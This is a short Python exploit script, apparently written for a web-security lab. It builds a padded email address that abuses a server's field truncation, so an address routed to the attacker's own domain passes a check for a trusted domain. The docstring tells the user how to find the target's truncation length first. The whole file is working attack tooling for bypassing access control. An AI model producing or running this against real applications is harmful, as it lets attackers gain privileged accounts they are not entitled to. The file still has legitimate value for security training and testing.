#!/usr/bin/env python3
"""
truncation_email.py

Builds a padded email address that exploits a mismatch between a
server's stored (truncated) field length and the real domain used for
mail delivery — e.g. registering with an address that LOOKS like it
ends in a trusted domain once truncated to N characters, while the
actual, untruncated address still routes mail to your own domain.

# NOTE: 255 is NOT a universal truncation limit — it's one specific
# backend's behavior (common because 2^8-1 / legacy VARCHAR(255)
# convention). Real targets may truncate at a different length, or not
# at all, or at different lengths in different fields (registration vs
# access-check vs display). Confirm the real cutoff on-target before
# trusting this number: register with a huge dummy string first, check
# where it got cut via My Account / password reset / any echo-back
# point, then pass that confirmed number as --cutoff below.
"""

import argparse


def build_email(trusted_domain: str, real_domain: str, cutoff: int):
    prefix = f"@{trusted_domain}."
    fixed_part = prefix + real_domain
    padding_len = cutoff - len(prefix) + 1  # +1 to land the trailing char of trusted_domain exactly at `cutoff`
    if padding_len < 0:
        raise ValueError(
            f"fixed_part ({prefix + real_domain!r}) alone is already longer "
            f"than the cutoff ({cutoff}) minus prefix length — this technique "
            f"won't fit. Check your cutoff value."
        )
    padding = "a" * padding_len
    email = padding + fixed_part
    return email, padding_len


def main():
    parser = argparse.ArgumentParser(
        description="Build a padded email for truncation-based domain-check bypass."
    )
    parser.add_argument("--trusted-domain", required=True, help="The domain the app's validator checks for, e.g. dontwannacry.com")
    parser.add_argument("--real-domain", required=True, help="Your actual mail-receiving domain, e.g. exploit-XXXX.exploit-server.net")
    parser.add_argument("--cutoff", type=int, default=255, help="Confirmed truncation length on the target (default 255 — VERIFY this on-target first, see module docstring)")
    args = parser.parse_args()

    email, padding_len = build_email(args.trusted_domain, args.real_domain, args.cutoff)
    print(email)
    print(f"Padding length: {padding_len}")
    print(f"Position of trusted domain's last char: {padding_len + len(args.trusted_domain) + 1}")
    print(f"Total email length: {len(email)}")


if __name__ == "__main__":
    main()
